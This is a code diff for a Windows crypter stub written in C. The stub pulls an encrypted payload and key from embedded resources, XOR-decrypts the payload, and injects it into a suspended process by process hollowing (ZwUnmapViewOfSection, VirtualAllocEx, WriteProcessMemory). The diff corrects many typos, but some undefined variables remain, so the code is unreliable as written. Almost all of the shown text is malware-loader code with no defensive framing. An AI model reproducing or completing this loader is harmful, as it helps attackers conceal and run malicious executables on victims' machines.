@@ -6,9 +6,7 @@
 //
 //
 
-#include "stub.h"
-#include <windows.h>
-#include <stdio.h>
+#include "stdafx.h"
 
 typedef void (WINAPI *PTRZwUnmapViewOfSection)(IN HANDLE ProcessHandle, IN PVOID BaseAddress);
 
@@ -48,13 +46,13 @@ void LoadStruct(struct StubData *sData)
     hResource = FindResource(NULL, MAKEINTRESOURCE(10), RT_RCDATA); // Finds filesize in builder
     if (!hResource)
         exit(EXIT_FAILURE);
-    sData->FileSize = sizeOfResource(NULL, hResource);
+    sData->FileSize = SizeofResource(NULL, hResource);
     
     //Get key size for stub data
     hResource = FindResource(NULL, MAKEINTRESOURCE(20), RT_RCDATA); //Finds keysize in builder
     if(!hResource)
         exit(EXIT_FAILURE);
-    sData->KeySize = sizeOfResource(NULL, hResource);
+    sData->KeySize = SizeofResource(NULL, hResource);
     
     // Map to memory
     hGlobal = LoadResource(NULL, hResource);
@@ -80,7 +78,7 @@ void Decrypt(struct StubData *sData)
         *(sData->pFileBuffer+i) ^= *(sData->pKey+j); //Xor the bytes in the file with the key at index j
         
         // Startover when we reach the end of the key
-        if (j>=sData->keySize)
+        if (j>=sData->KeySize)
             j=0;
         // As it loops through the file, when it reaches the end of the key it restarts
     }
@@ -91,7 +89,7 @@ void Decrypt(struct StubData *sData)
  * CONTEXT = Contains start address in relation to the EXE, contains location of kernel32
  */
  
-void runPortableExecutable(Struct StubData *sData)
+void runPortableExecutable(struct StubData *sData)
 {
     // si,pi, and ctx hold data associated with CreateProcess, essential for process to be created
     STARTUPINFO si;
@@ -105,26 +103,26 @@ void runPortableExecutable(Struct StubData *sData)
     PTRZwUnmapViewOfSection pZwUnmapViewOfSection = NULL;
     
     memset(&si, 0, sizeof(si)); // sets bytes at si pointer
-    si.cb = sizeOf(STARTUPINFO);
+    si.cb = sizeof(STARTUPINFO);
     ctx.ContextFlags = CONTEXT_FULL;
     
-    dosheader = (P_IMAGE_DOS_HEADER)&sData->pFileBuffer[0];
+    dosheader = (PIMAGE_DOS_HEADER)&sData->pFileBuffer[0];
     if (dosheader->e_magic !=IMAGE_DOS_SIGNATURE)
         return;
-    ntheader = (P_IMAGE_NT_HEADERS)&sData->pFileBuffer[dosheader->e_lfanew];
+    ntheader = (PIMAGE_NT_HEADERS)&sData->pFileBuffer[dosheader->e_lfanew];
     if (ntheader->Signature != IMAGE_NT_SIGNATURE)
         return;
     
     // Start the executable in frozen state to prepare to generate decrypted shellcode
-    CreateProcess(NULL, sData->FIleName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    CreateProcess(NULL, sData->FileName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
     
     pZwUnmapViewOfSection = (PTRZwUnmapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
     pZwUnmapViewOfSection(pi.hProcess, (void*)ntheader->OptionalHeader.ImageBase);
     
-    VirtualAllocEx(pi.hProcess, (void*)ntheader->OptionalHeader.ImageBase, ntheader->OptionalHeader.SIzeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    VirtualAllocEx(pi.hProcess, (void*)ntheader->OptionalHeader.ImageBase, ntheader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     WriteProcessMemory(pi.hProcess, (void *)ntheader->OptionalHeader.ImageBase, &sData ->pFileBuffer[0], ntheader->OptionalHeader.SizeOfHeaders, NULL);
     
-    for(int i=0; i<pinh->FileHeader.NumberOfSections; i++)
+    for(int i=0; i<ntheader->FileHeader.NumberOfSections; i++)
     {
         sectionheader = (PIMAGE_SECTION_HEADER)&sData->pFileBuffer[dosheader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADERS)*i];
          WriteProcessMemory(pi.hProcess, (void *)(pinh->OptionalHeader.ImageBase + pish->VirtualAddress), &sData->pFileBuffer[pish->PointerToRawData], pish->SizeOfRawData, NULL);
